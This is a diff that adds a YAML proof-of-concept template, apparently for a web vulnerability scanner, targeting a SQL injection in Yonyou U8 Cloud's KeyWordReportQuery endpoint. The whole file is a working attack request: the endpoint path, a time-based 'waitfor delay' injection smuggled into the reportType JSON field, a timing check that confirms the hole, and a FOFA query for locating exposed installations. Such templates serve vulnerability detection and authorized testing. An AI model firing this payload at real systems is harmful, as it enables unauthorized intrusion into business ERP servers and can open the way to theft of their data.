@@ -1,0 +1,23 @@
+id: poc-yaml-yongyou-u8-cloud-keywordreportquery-sqli
+info:
+  name: 用友U8 Cloud KeyWordReportQuery SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  - 两高一弱
+  finger: 用友U8cloud
+  fofa: app="用友-U8-Cloud"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 1
+requests:
+- method: POST
+  path: /service/~iufo/nc.itf.iufo.mobilereport.data.KeyWordReportQuery
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: '{"reportType":"1'';waitfor delay ''0:0:{{.t1}}''-- ","pageInfo":{"currentPageIndex":1,"pageSize":1},"keyword":[]}
+
+    '
+  expression: status_code == 200 && !contains(body,"<") && contains(body,"\"success\":true")
+    && duration >= t1 && duration <= t2
+transport: http
